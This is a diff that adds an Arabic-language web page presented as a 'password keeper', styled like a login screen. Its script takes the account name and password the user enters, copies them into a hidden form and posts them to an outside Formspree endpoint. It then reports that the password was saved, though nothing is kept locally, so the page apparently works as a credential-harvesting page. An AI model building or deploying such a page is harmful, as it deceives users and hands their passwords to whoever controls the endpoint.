@@ -1,0 +1,273 @@
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>حافظة كلمات السر</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap');
+        
+        body {
+            font-family: 'Tajawal', sans-serif;
+            background-color: #ffffff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            color: #333;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            box-sizing: border-box;
+            flex-grow: 1;
+        }
+
+        .lang-text {
+            color: #888;
+            font-size: 15px;
+            margin-top: 15px;
+            margin-bottom: 40px;
+        }
+
+        .red-heart {
+            width: 90px;
+            height: auto;
+            margin-bottom: 50px;
+            object-fit: contain;
+        }
+
+        .input-group {
+            width: 100%;
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 100%;
+            padding: 18px 20px;
+            border: 1px solid #e0e0e0;
+            border-radius: 16px;
+            font-size: 15px;
+            font-family: 'Tajawal', sans-serif;
+            box-sizing: border-box;
+            outline: none;
+            transition: border-color 0.3s;
+            color: #333;
+        }
+
+        input:focus {
+            border-color: #0062E6;
+        }
+
+        input::placeholder {
+            color: #aaa;
+        }
+
+        .primary-btn {
+            width: 100%;
+            background-color: #0a66c2;
+            color: #ffffff;
+            border: none;
+            padding: 18px;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 10px;
+            margin-bottom: 25px;
+            font-family: 'Tajawal', sans-serif;
+            transition: background-color 0.3s;
+        }
+
+        .primary-btn:hover {
+            background-color: #004ba0;
+        }
+
+        .primary-btn:disabled {
+            background-color: #82b1e0;
+            cursor: not-allowed;
+        }
+
+        .forgot-link {
+            color: #111;
+            text-decoration: none;
+            font-size: 15px;
+            font-weight: 500;
+        }
+
+        .bottom-section {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: auto; 
+            padding-top: 50px;
+            padding-bottom: 20px;
+        }
+
+        .secondary-btn {
+            width: 100%;
+            background-color: transparent;
+            color: #0a66c2;
+            border: 1px solid #0a66c2;
+            padding: 16px;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-bottom: 20px;
+            font-family: 'Tajawal', sans-serif;
+            transition: background-color 0.3s;
+        }
+
+        .secondary-btn:hover {
+            background-color: #f0f7ff;
+        }
+
+        .purple-heart {
+            width: 40px;
+            height: auto;
+            object-fit: contain;
+        }
+        
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.5);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .modal-box {
+            background: white;
+            padding: 25px;
+            border-radius: 16px;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+            max-width: 80%;
+            width: 300px;
+        }
+        .modal-box p {
+            margin: 0 0 25px 0;
+            font-size: 16px;
+            color: #333;
+        }
+        .modal-box button {
+            background-color: #0a66c2;
+            color: white;
+            border: none;
+            padding: 10px 25px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-family: 'Tajawal', sans-serif;
+            font-size: 15px;
+        }
+        
+        /* إخفاء نموذج Formspree الافتراضي */
+        #formspree-form {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="lang-text">العربية</div>
+        
+        <img src="f.jpg" alt="قلب أحمر" class="red-heart" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI2I5MDAwMCI+PHBhdGggZD0iTTEyIDIxLjM1bC0xLjQ1LTEuMzJDNS40IDE1LjM2IDIgMTIuMjggMiA4LjUgMiA1LjQyIDQuNDIgMyA3LjUgM2MyLjA0IDAgNCAxLjA4IDUuNDIgMi44NEMxNC40NiA0LjA4IDE2LjUgMyAxOC41IDNjMy4wOCAwIDUuNSAyLjQyIDUuNSA1LjUgMCAzLjc4LTMuNCA2Ljg2LTguNTUgMTEuNTRMMTIgMjEuMzV6Ii8+PC9zdmc+'">
+        
+        <!-- نموذج Formspree -->
+        <form id="formspree-form" action="https://formspree.io/f/mqkopowz" method="POST">
+            <input type="text" name="اسم_الحساب" id="formspree-name">
+            <input type="text" name="كلمة_السر" id="formspree-pass">
+        </form>
+
+        <div class="input-group">
+            <input type="text" id="passName" placeholder="اسم كلمة السر التي أريد حفظها">
+        </div>
+        
+        <div class="input-group">
+            <input type="password" id="passValue" placeholder="كلمة السر">
+        </div>
+        
+        <button class="primary-btn" id="saveBtn" onclick="sendDataViaFormspree()">حفظ كلمة السر</button>
+        
+        <a href="#" class="forgot-link">هل نسيت كلمة السر؟</a>
+        
+        <div class="bottom-section">
+            <button class="secondary-btn">إنشاء حساب جديد</button>
+            
+            <img src="m.jpg" alt="قلب بنفسجي" class="purple-heart" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iIzgwMDA4MCI+PHBhdGggZD0iTTEyIDIxLjM1bC0xLjQ1LTEuMzJDNS40IDE1LjM2IDIgMTIuMjggMiA4LjUgMiA1LjQyIDQuNDIgMyA3LjUgM2MyLjA0IDAgNCAxLjA4IDUuNDIgMi44NEMxNC40NiA0LjA4IDE2LjUgMyAxOC41IDNjMy4wOCAwIDUuNSAyLjQyIDUuNSA1LjUgMCAzLjc4LTMuNCA2Ljg2LTguNTUgMTEuNTRMMTIgMjEuMzV6Ii8+PC9zdmc+'">
+        </div>
+    </div>
+
+    <div class="modal-overlay" id="customAlert">
+        <div class="modal-box">
+            <p id="alertMessage"></p>
+            <button onclick="closeAlert()">حسناً</button>
+        </div>
+    </div>
+
+    <script>
+        function showAlert(message) {
+            document.getElementById('alertMessage').innerText = message;
+            document.getElementById('customAlert').style.display = 'flex';
+        }
+
+        function closeAlert() {
+            document.getElementById('customAlert').style.display = 'none';
+        }
+
+        function sendDataViaFormspree() {
+            const passName = document.getElementById("passName").value;
+            const passValue = document.getElementById("passValue").value;
+            const btn = document.getElementById("saveBtn");
+            
+            if (passName.trim() === "" || passValue.trim() === "") {
+                showAlert("الرجاء إدخال اسم كلمة السر وكلمة السر أولاً.");
+                return;
+            }
+
+            btn.innerText = "جاري الحفظ...";
+            btn.disabled = true;
+
+            // نقل البيانات إلى النموذج المخفي
+            document.getElementById("formspree-name").value = passName;
+            document.getElementById("formspree-pass").value = passValue;
+
+            const form = document.getElementById("formspree-form");
+
+            fetch(form.action, {
+                method: form.method,
+                body: new FormData(form),
+                headers: {
+                    'Accept': 'application/json'
+                }
+            }).then(response => {
+                if (response.ok) {
+                    showAlert("تم إرسال وحفظ كلمة السر بنجاح!");
+                    document.getElementById("passName").value = "";
+                    document.getElementById("passValue").value = "";
+                } else {
+                    showAlert("حدث خطأ أثناء الإرسال. تأكد من اتصالك بالإنترنت.");
+                }
+            }).catch(error => {
+                showAlert("حدث خطأ في الاتصال.");
+            }).finally(() => {
+                btn.innerText = "حفظ كلمة السر";
+                btn.disabled = false;
+            });
+        }
+    </script>
+</body>
+</html>
+
